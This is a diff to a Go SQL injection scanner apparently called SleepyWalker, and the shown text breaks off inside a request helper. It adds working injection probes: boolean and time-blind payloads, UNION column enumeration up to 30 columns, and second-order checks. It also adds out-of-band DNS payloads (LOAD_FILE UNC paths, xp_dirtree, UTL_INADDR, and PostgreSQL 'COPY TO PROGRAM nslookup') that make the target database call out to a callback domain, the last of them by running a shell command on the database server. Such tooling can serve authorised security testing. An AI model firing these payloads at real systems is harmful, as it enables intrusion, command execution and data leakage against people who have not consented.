@@ -1,16 +1,17 @@
 package scanner
 
 import (
-	"encoding/json"
 	"fmt"
-	"io"
 	"log"
 	"math"
 	"net/http"
 	"net/url"
+	"os"
 	"sort"
 	"strings"
 	"time"
+
+	"sleepywalker/internal/config"
 )
 
 // DeepResult holds the outcome of the deep local validation.
@@ -46,20 +47,23 @@ type techniqueSignal struct {
 //  8. Injection context detection (auto-tailor payloads)
 //  9. DB-specific confirmation probes (after engine hint from heuristic)
 // 10. Second-order detection stub
-func DeepValidate(suspicious []HeuristicResult) []DeepResult {
-	// Fix #3: timeout must exceed the maximum delay payload duration.
-	// Time-blind payloads inject SLEEP(3) × 3 rounds = up to ~9s + network overhead.
-	// 35s gives enough headroom without hanging indefinitely.
-	client := &http.Client{
-		Timeout: 35 * time.Second,
-		CheckRedirect: func(req *http.Request, via []*http.Request) error {
-			return http.ErrUseLastResponse
-		},
+// 11. Out-of-Band (OOB) DNS detection
+func DeepValidate(cfg *config.Config, suspicious []HeuristicResult) []DeepResult {
+	var client *http.Client
+	if cfg != nil {
+		client = cfg.BuildHTTPClient(35 * time.Second)
+	} else {
+		client = &http.Client{
+			Timeout: 35 * time.Second,
+			CheckRedirect: func(req *http.Request, via []*http.Request) error {
+				return http.ErrUseLastResponse
+			},
+		}
 	}
 
 	var results []DeepResult
 	for _, hr := range suspicious {
-		dr := deepProbe(client, hr)
+		dr := deepProbe(client, cfg, hr)
 		results = append(results, dr)
 		if dr.Confirmed {
 			log.Printf("[DEEP] ✓ Confirmed (%.0f%% confidence): %s %s — techniques: %v — DB: %s",
@@ -72,7 +76,7 @@ func DeepValidate(suspicious []HeuristicResult) []DeepResult {
 }
 
 // deepProbe runs all confirmation techniques against a single entry point.
-func deepProbe(client *http.Client, hr HeuristicResult) DeepResult {
+func deepProbe(client *http.Client, cfg *config.Config, hr HeuristicResult) DeepResult {
 	ep := hr.Entry
 	var signals []techniqueSignal
 	var bestPayload string
@@ -81,14 +85,14 @@ func deepProbe(client *http.Client, hr HeuristicResult) DeepResult {
 	param := pickParam(ep)
 
 	// Detect injection context first to tailor payloads
-	ctx := detectInjectionContext(client, ep, param)
+	ctx := detectInjectionContext(client, cfg, ep, param)
 	log.Printf("[DEEP]   Injection context for %s param=%s → %s", ep.URL, param, ctx)
 
 	// Detect DB engine hint from heuristic errors
 	dbHint := detectDBFromHeuristicErrors(hr.MatchedErrors)
 
 	// ── 1. Boolean-based blind ──────────────────────────────────────
-	if ok, payload := booleanBlindTest(client, ep, param, ctx); ok {
+	if ok, payload := booleanBlindTest(client, cfg, ep, param, ctx); ok {
 		signals = append(signals, techniqueSignal{"boolean-blind", true, 0.25, payload})
 		bestPayload = payload
 	} else {
@@ -96,7 +100,7 @@ func deepProbe(client *http.Client, hr HeuristicResult) DeepResult {
 	}
 
 	// ── 2. Time-based blind (multi-round median) ────────────────────
-	if ok, payload := timeBlindTestStatistical(client, ep, param, ctx); ok {
+	if ok, payload := timeBlindTestStatistical(client, cfg, ep, param, ctx); ok {
 		signals = append(signals, techniqueSignal{"time-blind", true, 0.20, payload})
 		if bestPayload == "" {
 			bestPayload = payload
@@ -106,7 +110,7 @@ func deepProbe(client *http.Client, hr HeuristicResult) DeepResult {
 	}
 
 	// ── 3. Error-based confirmation ─────────────────────────────────
-	if ok, payload := errorBasedTest(client, ep, param); ok {
+	if ok, payload := errorBasedTest(client, cfg, ep, param); ok {
 		signals = append(signals, techniqueSignal{"error-based", true, 0.15, payload})
 		if bestPayload == "" {
 			bestPayload = payload
@@ -116,7 +120,7 @@ func deepProbe(client *http.Client, hr HeuristicResult) DeepResult {
 	}
 
 	// ── 4. UNION-based column count ─────────────────────────────────
-	if ok, payload := unionTest(client, ep, param); ok {
+	if ok, payload := unionTest(client, cfg, ep, param); ok {
 		signals = append(signals, techniqueSignal{"union-based", true, 0.10, payload})
 		if bestPayload == "" {
 			bestPayload = payload
@@ -126,21 +130,21 @@ func deepProbe(client *http.Client, hr HeuristicResult) DeepResult {
 	}
 
 	// ── 5. Error consistency testing ────────────────────────────────
-	if ok := errorConsistencyTest(client, ep, param); ok {
+	if ok := errorConsistencyTest(client, cfg, ep, param); ok {
 		signals = append(signals, techniqueSignal{"error-consistency", true, 0.20, ""})
 	} else {
 		signals = append(signals, techniqueSignal{"error-consistency", false, 0.20, ""})
 	}
 
 	// ── 6. HTTP status code correlation ─────────────────────────────
-	if ok := statusCodeCorrelation(client, ep, param); ok {
+	if ok := statusCodeCorrelation(client, cfg, ep, param); ok {
 		signals = append(signals, techniqueSignal{"status-correlation", true, 0.08, ""})
 	} else {
 		signals = append(signals, techniqueSignal{"status-correlation", false, 0.08, ""})
 	}
 
 	// ── 7. Content-length delta analysis ────────────────────────────
-	if ok := contentLengthDelta(client, ep, param, ctx); ok {
+	if ok := contentLengthDelta(client, cfg, ep, param, ctx); ok {
 		signals = append(signals, techniqueSignal{"content-length-delta", true, 0.05, ""})
 	} else {
 		signals = append(signals, techniqueSignal{"content-length-delta", false, 0.05, ""})
@@ -148,7 +152,7 @@ func deepProbe(client *http.Client, hr HeuristicResult) DeepResult {
 
 	// ── 8. DB-specific confirmation probes ──────────────────────────
 	if dbHint != "" {
-		if ok, payload := dbSpecificProbe(client, ep, param, dbHint); ok {
+		if ok, payload := dbSpecificProbe(client, cfg, ep, param, dbHint); ok {
 			signals = append(signals, techniqueSignal{"db-specific-confirm", true, 0.15, payload})
 			if bestPayload == "" {
 				bestPayload = payload
@@ -158,11 +162,21 @@ func deepProbe(client *http.Client, hr HeuristicResult) DeepResult {
 		}
 	}
 
-	// ── 9. Second-order detection stub ──────────────────────────────
-	if ok := secondOrderStub(client, ep, param); ok {
+	// ── 9. Second-order detection ──────────────────────────────
+	if ok := secondOrderStub(client, cfg, ep, param); ok {
 		signals = append(signals, techniqueSignal{"second-order", true, 0.12, ""})
 	} else {
 		signals = append(signals, techniqueSignal{"second-order", false, 0.12, ""})
+	}
+
+	// ── 10. Out-of-Band (OOB) detection stub ───────────────────
+	if ok, payload := oobDetectionStub(client, cfg, ep, param, dbHint); ok {
+		signals = append(signals, techniqueSignal{"oob-dns", true, 0.10, payload})
+		if bestPayload == "" {
+			bestPayload = payload
+		}
+	} else {
+		signals = append(signals, techniqueSignal{"oob-dns", false, 0.10, ""})
 	}
 
 	// ── Weighted confidence scoring ─────────────────────────────────
@@ -212,10 +226,10 @@ const (
 
 // detectInjectionContext determines whether the parameter is inside a quoted
 // string, a numeric context, or an HTML attribute by analyzing error responses.
-func detectInjectionContext(client *http.Client, ep EntryPoint, param string) injectionContext {
-	sqResp := fetchWithPayload(client, ep, param, "1'")
-	dqResp := fetchWithPayload(client, ep, param, "1\"")
-	baseline := fetchWithPayload(client, ep, param, "1")
+func detectInjectionContext(client *http.Client, cfg *config.Config, ep EntryPoint, param string) injectionContext {
+	sqResp := fetchWithPayload(client, cfg, ep, param, "1'")
+	dqResp := fetchWithPayload(client, cfg, ep, param, "1\"")
+	baseline := fetchWithPayload(client, cfg, ep, param, "1")
 
 	if baseline == "" {
 		return ctxUnknown
@@ -247,7 +261,7 @@ func detectInjectionContext(client *http.Client, ep EntryPoint, param string) in
 	// Numeric check: only valid when baseline is a clean response (no errors).
 	// If baseline already contains DB errors, numSim will be artificially high.
 	if !baselineHasSyntaxError {
-		numResp := fetchWithPayload(client, ep, param, "1 AND 1=1")
+		numResp := fetchWithPayload(client, cfg, ep, param, "1 AND 1=1")
 		if numResp != "" {
 			numSim := jaccardSimilarity(baseline, numResp)
 			if numSim > 0.85 {
@@ -273,9 +287,9 @@ func containsAny(s string, subs []string) bool {
 // Technique 1: Boolean-based blind (enhanced with Jaccard similarity)
 // ═══════════════════════════════════════════════════════════════════════
 
-func booleanBlindTest(client *http.Client, ep EntryPoint, param string, ctx injectionContext) (bool, string) {
+func booleanBlindTest(client *http.Client, cfg *config.Config, ep EntryPoint, param string, ctx injectionContext) (bool, string) {
 	// Get a baseline first
-	baseline := fetchWithPayload(client, ep, param, "1")
+	baseline := fetchWithPayload(client, cfg, ep, param, "1")
 	if baseline == "" {
 		return false, ""
 	}
@@ -312,8 +326,8 @@ func booleanBlindTest(client *http.Client, ep EntryPoint, param string, ctx inje
 	}
 
 	for _, pair := range pairs {
-		trueResp := fetchWithPayload(client, ep, param, pair.truePl)
-		falseResp := fetchWithPayload(client, ep, param, pair.falsePl)
+		trueResp := fetchWithPayload(client, cfg, ep, param, pair.truePl)
+		falseResp := fetchWithPayload(client, cfg, ep, param, pair.falsePl)
 
 		if trueResp == "" || falseResp == "" {
 			continue
@@ -388,17 +402,44 @@ func wordSet(s string) map[string]bool {
 	return set
 }
 
+// htmlStripJaccard strips HTML tags from both strings before computing
+// word-level Jaccard similarity. This reduces noise from dynamic page
+// templates (timestamps, CSRF tokens, ads, nonces) and gives a more
+// accurate content-level comparison on large HTML pages.
+func htmlStripJaccard(a, b string) float64 {
+	return jaccardSimilarity(stripHTMLTags(a), stripHTMLTags(b))
+}
+
+// stripHTMLTags removes HTML/XML tags from a string, leaving only text content.
+// Also collapses whitespace for cleaner word-level comparison.
+func stripHTMLTags(s string) string {
+	var out strings.Builder
+	inTag := false
+	for _, r := range s {
+		switch {
+		case r == '<':
+			inTag = true
+		case r == '>':
+			inTag = false
+			out.WriteByte(' ') // replace tag with space to separate words
+		case !inTag:
+			out.WriteRune(r)
+		}
+	}
+	return out.String()
+}
+
 // ═══════════════════════════════════════════════════════════════════════
 // Technique 2: Time-based blind (multi-round statistical)
 // ═══════════════════════════════════════════════════════════════════════
 
-func timeBlindTestStatistical(client *http.Client, ep EntryPoint, param string, ctx injectionContext) (bool, string) {
+func timeBlindTestStatistical(client *http.Client, cfg *config.Config, ep EntryPoint, param string, ctx injectionContext) (bool, string) {
 	const rounds = 3
 
 	// Measure baseline timing (3 rounds, take median)
 	var baseTimes []time.Duration
 	for i := 0; i < rounds; i++ {
-		t := measureTime(client, ep, param, "1")
+		t := measureTime(client, cfg, ep, param, "1")
 		if t < 0 {
 			return false, ""
 		}
@@ -425,7 +466,7 @@ func timeBlindTestStatistical(client *http.Client, ep EntryPoint, param string, 
 		// Run multiple rounds to reduce noise
 		var timings []time.Duration
 		for i := 0; i < rounds; i++ {
-			elapsed := measureTime(client, ep, param, dp.payload)
+			elapsed := measureTime(client, cfg, ep, param, dp.payload)
 			if elapsed < 0 {
 				break
 			}
@@ -469,7 +510,7 @@ func medianDuration(d []time.Duration) time.Duration {
 // ═══════════════════════════════════════════════════════════════════════
 
 // errorBasedTest uses targeted error-eliciting payloads to confirm injection.
-func errorBasedTest(client *http.Client, ep EntryPoint, param string) (bool, string) {
+func errorBasedTest(client *http.Client, cfg *config.Config, ep EntryPoint, param string) (bool, string) {
 	payloads := []struct {
 		payload string
 		errors  []string
@@ -491,7 +532,7 @@ func errorBasedTest(client *http.Client, ep EntryPoint, param string) (bool, str
 	}
 
 	for _, p := range payloads {
-		body := fetchWithPayload(client, ep, param, p.payload)
+		body := fetchWithPayload(client, cfg, ep, param, p.payload)
 		if body == "" {
 			continue
 		}
@@ -511,25 +552,32 @@ func errorBasedTest(client *http.Client, ep EntryPoint, param string) (bool, str
 
 // unionTest tries UNION SELECT with incrementing column counts to see
 // if any count produces a valid (non-error) response.
-func unionTest(client *http.Client, ep EntryPoint, param string) (bool, string) {
+// Enhanced: searches up to 30 columns, uses binary search for efficiency,
+// and tests string marker columns to identify reflecting positions.
+func unionTest(client *http.Client, cfg *config.Config, ep EntryPoint, param string) (bool, string) {
 	// First get a baseline error response (with a bad union)
-	errorBody := fetchWithPayload(client, ep, param, "1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- -")
+	errorBody := fetchWithPayload(client, cfg, ep, param, "1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- -")
 
-	for cols := 1; cols <= 15; cols++ {
-		nulls := make([]string, cols)
-		for i := range nulls {
-			nulls[i] = "NULL"
+	errorMarkers := []string{"syntax error", "mismatch", "different number", "operand", "column"}
+
+	// Helper: check if a UNION with N columns produces an error.
+	testCols := func(n int, useMarker bool) (bool, string) {
+		cols := make([]string, n)
+		for i := range cols {
+			if useMarker && i == 0 {
+				cols[i] = "'sw_marker'"
+			} else {
+				cols[i] = "NULL"
+			}
 		}
-		payload := fmt.Sprintf("1 UNION SELECT %s-- -", strings.Join(nulls, ","))
-		body := fetchWithPayload(client, ep, param, payload)
+		payload := fmt.Sprintf("1 UNION SELECT %s-- -", strings.Join(cols, ","))
+		body := fetchWithPayload(client, cfg, ep, param, payload)
 		if body == "" {
-			continue
+			return false, payload
 		}
 
 		lower := strings.ToLower(body)
-		// Success indicators: no SQL error AND response differs from the error body
 		hasError := false
-		errorMarkers := []string{"syntax error", "mismatch", "different number", "operand", "union select"}
 		for _, marker := range errorMarkers {
 			if strings.Contains(lower, marker) {
 				hasError = true
@@ -538,12 +586,45 @@ func unionTest(client *http.Client, ep EntryPoint, param string) (bool, string) 
 		}
 
 		if !hasError && len(body) > 0 {
-			// If this response differs from the error body, we likely found the right column count
+			// Check for response difference from the error body.
 			if errorBody != "" && math.Abs(float64(len(body)-len(errorBody)))/math.Max(float64(len(errorBody)), 1) > 0.10 {
-				return true, fmt.Sprintf("1 UNION SELECT %s-- -", strings.Join(nulls, ","))
+				return true, payload
+			}
+			// Check if our string marker reflected in the response.
+			if useMarker && strings.Contains(lower, "sw_marker") {
+				return true, payload
 			}
 		}
+		return false, payload
 	}
+
+	// Phase 1: Linear scan 1–15 with NULL columns.
+	for cols := 1; cols <= 15; cols++ {
+		if ok, payload := testCols(cols, false); ok {
+			// Re-test with string marker to confirm reflection.
+			if ok2, payload2 := testCols(cols, true); ok2 {
+				return true, payload2
+			}
+			return true, payload
+		}
+	}
+
+	// Phase 2: Binary search 16–30 to find the right count faster.
+	lo, hi := 16, 30
+	for lo <= hi {
+		mid := (lo + hi) / 2
+		if ok, payload := testCols(mid, false); ok {
+			// Re-test with marker.
+			if ok2, payload2 := testCols(mid, true); ok2 {
+				return true, payload2
+			}
+			return true, payload
+		}
+		// If the error mentions "different number of columns", we need to adjust.
+		// We can't reliably determine direction from error messages, so scan outward.
+		lo = mid + 1
+	}
+
 	return false, ""
 }
 
@@ -553,7 +634,7 @@ func unionTest(client *http.Client, ep EntryPoint, param string) (bool, string) 
 
 // errorConsistencyTest fires the same error-inducing payload 3 times and checks
 // if the error appears consistently — flaky responses indicate coincidental matches.
-func errorConsistencyTest(client *http.Client, ep EntryPoint, param string) bool {
+func errorConsistencyTest(client *http.Client, cfg *config.Config, ep EntryPoint, param string) bool {
 	testPayload := "1'"
 	errorKeywords := []string{
 		"syntax error", "you have an error", "unterminated", "unclosed quotation",
@@ -564,7 +645,7 @@ func errorConsistencyTest(client *http.Client, ep EntryPoint, param string) bool
 	const rounds = 3
 
 	for i := 0; i < rounds; i++ {
-		body := fetchWithPayload(client, ep, param, testPayload)
+		body := fetchWithPayload(client, cfg, ep, param, testPayload)
 		if body == "" {
 			continue
 		}
@@ -589,9 +670,9 @@ func errorConsistencyTest(client *http.Client, ep EntryPoint, param string) bool
 
 // statusCodeCorrelation checks if injection payloads consistently trigger
 // 500/503 errors while baseline returns 200.
-func statusCodeCorrelation(client *http.Client, ep EntryPoint, param string) bool {
+func statusCodeCorrelation(client *http.Client, cfg *config.Config, ep EntryPoint, param string) bool {
 	// Get baseline status
-	baseStatus := fetchStatusCode(client, ep, param, "1")
+	baseStatus := fetchStatusCode(client, cfg, ep, param, "1")
 	if baseStatus == 0 || baseStatus >= 400 {
 		return false // baseline already erroring, unreliable
 	}
@@ -600,7 +681,7 @@ func statusCodeCorrelation(client *http.Client, ep EntryPoint, param string) boo
 	errorStatusCount := 0
 
 	for _, payload := range errorPayloads {
-		status := fetchStatusCode(client, ep, param, payload)
+		status := fetchStatusCode(client, cfg, ep, param, payload)
 		if status >= 500 {
 			errorStatusCount++
 		}
@@ -611,39 +692,9 @@ func statusCodeCorrelation(client *http.Client, ep EntryPoint, param string) boo
 }
 
 // fetchStatusCode sends a request and returns just the HTTP status code.
-func fetchStatusCode(client *http.Client, ep EntryPoint, param, payload string) int {
-	var resp *http.Response
-	var err error
-
-	switch ep.Method {
-	case "POST":
-		form := url.Values{}
-		for k, v := range ep.Params {
-			if k == param {
-				form.Set(k, payload)
-			} else {
-				neutral := v
-				if neutral == "" {
-					neutral = "1"
-				}
-				form.Set(k, neutral)
-			}
-		}
-		resp, err = client.PostForm(ep.URL, form)
-	default:
-		u, buildErr := buildURL(ep, param, payload)
-		if buildErr != nil {
-			return 0
-		}
-		resp, err = client.Get(u)
-	}
-
-	if err != nil {
-		return 0
-	}
-	defer resp.Body.Close()
-	io.Copy(io.Discard, resp.Body)
-	return resp.StatusCode
+func fetchStatusCode(client *http.Client, cfg *config.Config, ep EntryPoint, param, payload string) int {
+	_, code, _ := fetchParamWithPayloadWithStatus(client, cfg, ep, param, payload)
+	return code
 }
 
 // ═══════════════════════════════════════════════════════════════════════
@@ -652,7 +703,7 @@ func fetchStatusCode(client *http.Client, ep EntryPoint, param, payload string) 
 
 // contentLengthDelta measures consistent byte-size differences between
 // tautology and contradiction responses — a reliable blind SQLi indicator.
-func contentLengthDelta(client *http.Client, ep EntryPoint, param string, ctx injectionContext) bool {
+func contentLengthDelta(client *http.Client, cfg *config.Config, ep EntryPoint, param string, ctx injectionContext) bool {
 	type pair struct {
 		truePl  string
 		falsePl string
@@ -679,8 +730,8 @@ func contentLengthDelta(client *http.Client, ep EntryPoint, param string, ctx in
 		var deltas []int
 
 		for i := 0; i < rounds; i++ {
-			trueResp := fetchWithPayload(client, ep, param, p.truePl)
-			falseResp := fetchWithPayload(client, ep, param, p.falsePl)
+			trueResp := fetchWithPayload(client, cfg, ep, param, p.truePl)
+			falseResp := fetchWithPayload(client, cfg, ep, param, p.falsePl)
 			if trueResp == "" || falseResp == "" {
 				consistent = false
 				break
@@ -761,7 +812,7 @@ func detectDBFromHeuristicErrors(errors []string) string {
 
 // dbSpecificProbe fires a DB-specific confirmation payload after the engine
 // has been identified from heuristic errors.
-func dbSpecificProbe(client *http.Client, ep EntryPoint, param, dbEngine string) (bool, string) {
+func dbSpecificProbe(client *http.Client, cfg *config.Config, ep EntryPoint, param, dbEngine string) (bool, string) {
 	type probe struct {
 		payload    string
 		signatures []string
@@ -809,10 +860,10 @@ func dbSpecificProbe(client *http.Client, ep EntryPoint, param, dbEngine string)
 		return false, ""
 	}
 
-	baseline := fetchWithPayload(client, ep, param, "1")
+	baseline := fetchWithPayload(client, cfg, ep, param, "1")
 
 	for _, p := range probes {
-		body := fetchWithPayload(client, ep, param, p.payload)
+		body := fetchWithPayload(client, cfg, ep, param, p.payload)
 		if body == "" {
 			continue
 		}
@@ -840,10 +891,11 @@ func dbSpecificProbe(client *http.Client, ep EntryPoint, param, dbEngine string)
 // Technique 10: Second-Order Detection Stub
 // ═══════════════════════════════════════════════════════════════════════
 
-// secondOrderStub stores a marker payload via POST, then fetches the same URL
-// via GET to check if the marker reflects in the response — indicates stored
-// or second-order SQL injection. This is a lightweight heuristic.
-func secondOrderStub(client *http.Client, ep EntryPoint, param string) bool {
+// secondOrderStub stores a marker payload via POST, then checks related
+// display URLs for SQL errors — indicating stored/second-order SQL injection.
+// Improved: instead of only re-fetching the exact POST URL, it also checks
+// common related display pages (e.g., /profile, /dashboard, parent path).
+func secondOrderStub(client *http.Client, cfg *config.Config, ep EntryPoint, param string) bool {
 	// Only applicable for POST entry points with a display/profile page
 	if ep.Method != "POST" {
 		return false
@@ -852,53 +904,186 @@ func secondOrderStub(client *http.Client, ep EntryPoint, param string) bool {
 	// Use a marker that would cause an error if it gets into a SQL query
 	marker := "sw_probe_1'" // single-quote to break SQL context
 
-	// Store the marker
-	form := url.Values{}
-	for k, v := range ep.Params {
-		if k == param {
-			form.Set(k, marker)
-		} else {
-			neutral := v
-			if neutral == "" {
-				neutral = "test"
-			}
-			form.Set(k, neutral)
-		}
-	}
-
-	resp, err := client.PostForm(ep.URL, form)
-	if err != nil {
-		return false
-	}
-	// Drain body so the TCP connection is returned to the pool.
-	io.Copy(io.Discard, resp.Body)
-	resp.Body.Close()
-
-	// Now fetch the same URL via GET and look for SQL errors
-	getResp, err := client.Get(ep.URL)
-	if err != nil {
-		return false
-	}
-	defer getResp.Body.Close()
-	body, err := io.ReadAll(io.LimitReader(getResp.Body, 256*1024))
+	// Store the marker using the unified helper to ensure headers/cookies/method are correct.
+	_, _, err := fetchParamWithPayloadWithStatus(client, cfg, ep, param, marker)
 	if err != nil {
 		return false
 	}
 
-	lower := strings.ToLower(string(body))
+	// Build a list of candidate display URLs to check for reflected errors.
+	candidateURLs := inferRelatedDisplayURLs(ep.URL)
+
 	errorSigns := []string{
 		"syntax error", "unterminated", "unclosed quotation",
 		"you have an error", "mysql", "ora-", "pg_query",
+		"sqlite", "jdbc", "odbc",
 	}
 
-	for _, sign := range errorSigns {
-		if strings.Contains(lower, sign) {
-			log.Printf("[DEEP]   Second-order: POST→GET triggered SQL error at %s", ep.URL)
-			return true
+	for _, checkURL := range candidateURLs {
+		req, err := http.NewRequest("GET", checkURL, nil)
+		if err != nil {
+			continue
+		}
+		req.Header.Set("User-Agent", "SleepyWalker/1.0")
+		if cfg != nil {
+			cfg.ApplyHeaders(req)
+		}
+		body, _, err := doRequestWithStatus(client, req)
+		if err != nil {
+			continue
+		}
+
+		lower := strings.ToLower(body)
+		for _, sign := range errorSigns {
+			if strings.Contains(lower, sign) {
+				log.Printf("[DEEP]   Second-order: POST %s → GET %s triggered SQL error", ep.URL, checkURL)
+				return true
+			}
 		}
 	}
 
 	return false
+}
+
+// inferRelatedDisplayURLs generates candidate URLs where stored/second-order
+// SQL injection might manifest after a POST. For example:
+//   POST /profile/edit  → check /profile, /profile/view, /profile/edit, /dashboard
+//   POST /user/1/update → check /user/1, /user/1/update
+func inferRelatedDisplayURLs(postURL string) []string {
+	parsed, err := url.Parse(postURL)
+	if err != nil {
+		return []string{postURL}
+	}
+
+	candidates := []string{postURL} // always check the POST URL itself
+
+	path := strings.TrimRight(parsed.Path, "/")
+	segments := strings.Split(path, "/")
+
+	// Remove common action suffixes to find the display URL.
+	actionSuffixes := []string{"edit", "update", "save", "create", "new", "add", "modify", "delete"}
+	if len(segments) > 1 {
+		last := strings.ToLower(segments[len(segments)-1])
+		for _, suffix := range actionSuffixes {
+			if last == suffix {
+				// e.g., /profile/edit → /profile
+				parentPath := strings.Join(segments[:len(segments)-1], "/")
+				parentURL := fmt.Sprintf("%s://%s%s", parsed.Scheme, parsed.Host, parentPath)
+				candidates = append(candidates, parentURL)
+
+				// Also try /profile/view
+				viewURL := fmt.Sprintf("%s://%s%s/view", parsed.Scheme, parsed.Host, parentPath)
+				candidates = append(candidates, viewURL)
+				break
+			}
+		}
+
+		// Also try the parent path (e.g., /user/1/orders → /user/1)
+		parentPath := strings.Join(segments[:len(segments)-1], "/")
+		parentURL := fmt.Sprintf("%s://%s%s", parsed.Scheme, parsed.Host, parentPath)
+		candidates = append(candidates, parentURL)
+	}
+
+	// Add common display pages.
+	baseURL := fmt.Sprintf("%s://%s", parsed.Scheme, parsed.Host)
+	candidates = append(candidates, baseURL+"/dashboard", baseURL+"/profile")
+
+	// Deduplicate.
+	seen := make(map[string]bool)
+	var unique []string
+	for _, u := range candidates {
+		if !seen[u] {
+			seen[u] = true
+			unique = append(unique, u)
+		}
+	}
+	return unique
+}
+
+// ═════════════════════════════════════════════════════════════════════
+// Technique 11: Out-of-Band (OOB) DNS Detection Stub
+// ═════════════════════════════════════════════════════════════════════
+
+// oobDetectionStub fires DNS-based out-of-band payloads when the
+// SLEEPYWALKER_OOB_DOMAIN environment variable is set. This enables
+// detection of blind SQL injection that does not alter the HTTP response
+// but causes the DB to make an outbound DNS request.
+//
+// The payloads target DB-specific DNS resolution functions:
+//   - MySQL: LOAD_FILE with UNC path
+//   - MSSQL: xp_dirtree / master..xp_fileexist
+//   - Oracle: UTL_INADDR.GET_HOST_ADDRESS
+//   - PostgreSQL: COPY ... FROM PROGRAM
+//
+// If any payload causes a response change (status shift, error message),
+// it also counts as a positive signal. The actual DNS callback check is
+// left to external tools (e.g., interactsh) or future integration.
+func oobDetectionStub(client *http.Client, cfg *config.Config, ep EntryPoint, param, dbHint string) (bool, string) {
+	oobDomain := os.Getenv("SLEEPYWALKER_OOB_DOMAIN")
+	if oobDomain == "" {
+		return false, ""
+	}
+
+	// Generate a unique subdomain per probe for callback correlation.
+	marker := fmt.Sprintf("sw%d", time.Now().UnixNano()%100000)
+	callbackHost := fmt.Sprintf("%s.%s", marker, oobDomain)
+
+	// DB-specific OOB payloads.
+	type oobPayload struct {
+		db      string
+		payload string
+	}
+
+	var payloads []oobPayload
+
+	// Always fire the generic payloads; add DB-specific ones if we have a hint.
+	payloads = append(payloads,
+		oobPayload{"MySQL", fmt.Sprintf("1' AND LOAD_FILE('\\\\\\\\%s\\\\a')-- -", callbackHost)},
+		oobPayload{"MSSQL", fmt.Sprintf("1'; EXEC master..xp_dirtree '\\\\\\\\%s\\\\a'-- -", callbackHost)},
+		oobPayload{"Oracle", fmt.Sprintf("1' AND 1=UTL_INADDR.GET_HOST_ADDRESS('%s')-- -", callbackHost)},
+		oobPayload{"PostgreSQL", fmt.Sprintf("1'; COPY (SELECT '') TO PROGRAM 'nslookup %s'-- -", callbackHost)},
+	)
+
+	// If we have a DB hint, try those first.
+	if dbHint != "" {
+		sort.SliceStable(payloads, func(i, j int) bool {
+			return payloads[i].db == dbHint
+		})
+	}
+
+	baseline := fetchWithPayload(client, cfg, ep, param, "1")
+
+	for _, p := range payloads {
+		body := fetchWithPayload(client, cfg, ep, param, p.payload)
+		if body == "" {
+			continue
+		}
+
+		// Check if the response differs from baseline (error triggered, status change).
+		if baseline != "" {
+			sim := jaccardSimilarity(baseline, body)
+			if sim < 0.70 {
+				log.Printf("[DEEP]   OOB: payload caused response change (sim=%.2f, db=%s, callback=%s)",
+					sim, p.db, callbackHost)
+				return true, p.payload
+			}
+		}
+
+		// Check for SQL errors in the response (some OOB payloads may break syntax).
+		lower := strings.ToLower(body)
+		errorSigns := []string{"syntax error", "xp_dirtree", "utl_inaddr", "load_file", "permission denied"}
+		for _, sign := range errorSigns {
+			if strings.Contains(lower, sign) {
+				log.Printf("[DEEP]   OOB: payload triggered error (db=%s, sign=%s, callback=%s)",
+					p.db, sign, callbackHost)
+				return true, p.payload
+			}
+		}
+	}
+
+	log.Printf("[DEEP]   OOB: payloads sent to %s — check DNS callback logs for %s.%s",
+		ep.URL, marker, oobDomain)
+	return false, ""
 }
 
 // ═══════════════════════════════════════════════════════════════════════
@@ -950,135 +1135,18 @@ func buildURL(ep EntryPoint, param, payload string) (string, error) {
 // fetchWithPayload sends a request with a single param set to the payload and returns the body.
 // Preserves actual declared param values as neutrals (e.g. Submit=Submit) so
 // server-side isset() checks don't skip the query.
-func fetchWithPayload(client *http.Client, ep EntryPoint, param, payload string) string {
-	var resp *http.Response
-	var err error
-
-	switch ep.Method {
-	case "POST":
-		form := url.Values{}
-		for k, v := range ep.Params {
-			if k == param {
-				form.Set(k, payload)
-			} else {
-				neutral := v
-				if neutral == "" {
-					neutral = "1"
-				}
-				form.Set(k, neutral)
-			}
-		}
-		resp, err = client.PostForm(ep.URL, form)
-	default:
-		u, buildErr := buildURL(ep, param, payload)
-		if buildErr != nil {
-			return ""
-		}
-		resp, err = client.Get(u)
-	}
-
-	if err != nil {
-		return ""
-	}
-	defer resp.Body.Close()
-	limited := io.LimitReader(resp.Body, 256*1024)
-	b, err := io.ReadAll(limited)
-	if err != nil {
-		return ""
-	}
-	return string(b)
+func fetchWithPayload(client *http.Client, cfg *config.Config, ep EntryPoint, param, payload string) string {
+	body, _, _ := fetchParamWithPayloadWithStatus(client, cfg, ep, param, payload)
+	return body
 }
 
 // measureTime sends a request and returns the wall-clock duration.
 // Handles all injection locations: query, body (POST/PUT/PATCH), header, json.
-func measureTime(client *http.Client, ep EntryPoint, param, payload string) time.Duration {
+func measureTime(client *http.Client, cfg *config.Config, ep EntryPoint, param, payload string) time.Duration {
 	start := time.Now()
-	var resp *http.Response
-	var err error
-
-	switch ep.InjectionLoc {
-	case "header":
-		req, reqErr := http.NewRequest("GET", ep.URL, nil)
-		if reqErr != nil {
-			return -1
-		}
-		req.Header.Set("User-Agent", "SleepyWalker/1.0")
-		req.Header.Set(param, payload)
-		resp, err = client.Do(req)
-
-	case "json":
-		jsonBody := make(map[string]interface{})
-		for k, v := range ep.Params {
-			if k == param {
-				jsonBody[k] = payload
-			} else {
-				if v == "" {
-					v = "1"
-				}
-				jsonBody[k] = v
-			}
-		}
-		b, marshalErr := json.Marshal(jsonBody)
-		if marshalErr != nil {
-			return -1
-		}
-		req, reqErr := http.NewRequest("POST", ep.URL, strings.NewReader(string(b)))
-		if reqErr != nil {
-			return -1
-		}
-		req.Header.Set("Content-Type", "application/json")
-		req.Header.Set("User-Agent", "SleepyWalker/1.0")
-		resp, err = client.Do(req)
-
-	case "body", "multipart":
-		form := url.Values{}
-		for k, v := range ep.Params {
-			if k == param {
-				form.Set(k, payload)
-			} else {
-				if v == "" {
-					v = "1"
-				}
-				form.Set(k, v)
-			}
-		}
-		req, reqErr := http.NewRequest(ep.Method, ep.URL, strings.NewReader(form.Encode()))
-		if reqErr != nil {
-			return -1
-		}
-		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
-		req.Header.Set("User-Agent", "SleepyWalker/1.0")
-		resp, err = client.Do(req)
-
-	default: // query / GET
-		u, buildErr := buildURL(ep, param, payload)
-		if buildErr != nil {
-			return -1
-		}
-		switch ep.Method {
-		case "POST":
-			form := url.Values{}
